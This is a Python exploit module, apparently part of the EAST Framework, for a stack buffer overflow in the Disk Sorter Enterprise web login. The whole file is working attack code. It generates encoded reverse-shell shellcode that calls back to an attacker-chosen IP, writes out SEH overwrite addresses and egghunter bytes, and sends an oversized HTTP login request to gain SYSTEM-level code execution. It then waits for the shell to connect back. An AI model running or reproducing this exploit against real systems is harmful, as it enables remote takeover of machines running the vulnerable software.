#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import socket
import struct
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_disk_sorter_enterprise_bof_rce"
INFO['DESCRIPTION'] = "Disk Sorter Enterprise - 'Login' Buffer Overflow'"
INFO['VENDOR'] = "http://www.disksorter.com/"
INFO['DOWNLOAD_LINK'] = 'http://www.disksorter.com/downloads.html'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40458/', 'https://www.exploit-db.com/exploits/40833/']
INFO["CVE Name"] = ''
INFO["NOTES"] = """
This module exploits a stack buffer overflow. If a malicious user sends a malicious HTTP login request, it is possible to execute a payload that would run under the Windows NT AUTHORITY\SYSTEM account. Due to size constraints, this module uses the Egghunter technique.
Tested on WINDIWS 7 SP1
"""

INFO['CHANGELOG'] = "30 Nov, 2016. Written by East team"
INFO['PATH'] = 'Exploits/General/'

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.1.207', dict(description = 'Target IP')
OPTIONS['PORT'] = 80, dict(description = 'Target port')
OPTIONS['TARGET_VERSION'] = dict(options=["9.1.12", "9.0.24"], selected="9.1.12"), dict(description = 'Target software version')
OPTIONS['CALLBACK_IP'] = socket.gethostbyname(socket.gethostname()), dict(description = 'Callback IP')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.callback_ip = ''
        self.version = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
        self.version = self.args.get('TARGET_VERSION', "9.1.12")
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            self.log('Listener not enabled')
            return None
        
        os_target = ShellUtils.Constants.OS.WINDOWS
        os_target_arch = ShellUtils.Constants.OS_ARCH.X32        
        badchars = ["\x00", "\x0a", "\x0d", "\x26"]
        shellcode_type = "reverse"
        
        s = Shellcodes.OSShellcodes(os_target, os_target_arch, self.callback_ip, port, badchars)
        shellcode = s.create_shellcode(shellcode_type, encode=ShellUtils.Constants.EncoderType.XOR)
        
        self.log("Length of shellcode: %d" % len(shellcode))
        self.log("[+] Generate shellcode finished")
        
        return shellcode
    
    def run(self):
        self.args()
        self.log('Attacking {}'.format(self.host))
                    
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
            
        shellcode = self.make_sploit()
        if not shellcode:
            self.log('Shellcode not generated')
            self.finish(False)
            
        s = socket.socket()
        connect = s.connect((self.host, self.port))
        
        if self.version[2] == '0':
            seh = "\x36\x8d\x04\x10"
            junk1 = '\x41' * (12600 - len(shellcode))
            junk2 = '\x90' * 70 + '\x42' * 1614
            junk3 = 7010
            self.log('version 9.0.24')
        else:
            seh = "\xDD\xF9\x04\x10"
            junk1 = '\x41' * (13972 - len(shellcode)) + 'B' * 100
            junk2 = '\x90' * 212
            junk3 = 8672
            self.log('version 9.1.12')
            
        nseh = '\x90\x90\xEB\x0B'
         
        hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
        
        payload =  "POST /login HTTP/1.1\r\n"
        payload += "Host: {}\r\n".format(self.host)
        payload += "User-Agent: Mozilla/5.0\r\n"
        payload += "Connection: close\r\n"
        payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        payload += "Accept-Language: en-us,en;q=0.5\r\n"
        payload += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
        payload += "Keep-Alive: 300\r\n"
        payload += "Proxy-Connection: keep-alive\r\n"
        payload += "Content-Type: application/x-www-form-urlencoded\r\n"
        payload += "Content-Length: 17000\r\n\r\n"
        payload += "username=admin"
        payload += "&password=aaaaa\r\n"
        payload += junk1
        payload += "w00tw00t"
        payload += shellcode
        payload += junk2
        payload += nseh
        payload += seh
        payload += "\x90" * 10
        payload += hunter
        payload += "\x90" * junk3
        
        try:
            s.sendall(payload)
        except Exception as e:
            self.log(e)
            self.finish(False)
        s.close()
        
        self.log('Payload sent. Wait for callback connection')
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()